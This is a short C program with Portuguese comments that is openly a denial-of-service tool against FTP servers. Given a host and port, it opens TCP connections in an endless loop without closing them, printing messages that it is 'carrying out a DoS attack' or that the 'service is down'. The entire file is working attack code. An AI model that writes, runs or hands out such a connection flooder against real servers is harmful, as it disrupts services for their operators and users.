#include <stdio.h>
#include <netdb.h>
#include <arpa/inet.h>

int main (int argc, char *argv[])
{
	int meusocket;
	int conecta;
	struct sockaddr_in alvo;
	struct hostent *host;
	
	int count = 0;
	char *target;
	target = argv[1];

	if(argc < 2)
	{	
		printf("Informar IP ou dominio e porta\n");
		return 0;	
	}else{
		host = gethostbyname(target);

		while(1)
		{
			meusocket = socket(AF_INET, SOCK_STREAM, 0);
			alvo.sin_family = AF_INET;
			alvo.sin_port = htons(atoi(argv[2]));
			
			/*converte hostname em IP sem levantar um socket: inet_ntoa(*((struct in_addr *)host->h_addr))
			adicionei esse codigo direto na montagem para indepente de quando for digitado IP ou hostname o programa funcione */
			
			
			alvo.sin_addr.s_addr = inet_addr(inet_ntoa(*((struct in_addr *)host->h_addr)));
			conecta = connect(meusocket, (struct sockaddr *)&alvo, sizeof alvo);

			if(conecta == 0)
			{
				printf("%d - Realizando ataque DoS no FTP \n", count);
			}else{
				printf("Servico down \n");
			}
			count++;
		}		
	}
}
